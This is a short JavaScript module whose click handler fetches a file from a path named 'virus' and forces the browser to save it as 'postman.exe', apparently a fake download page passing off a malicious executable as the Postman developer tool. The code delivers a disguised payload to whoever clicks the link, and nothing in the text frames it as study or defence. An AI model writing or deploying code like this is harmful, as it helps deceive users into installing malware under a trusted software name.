export function downloadFile() {
    fetch('../../virus/')
        .then(response => response.blob())
        .then(blob => {
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = 'postman.exe';
            document.body.appendChild(link);
            link.click();
            URL.revokeObjectURL(url);
            document.body.removeChild(link);
        });
}

export function handleDownloadClick(event) {
    event.preventDefault();
    downloadFile();
}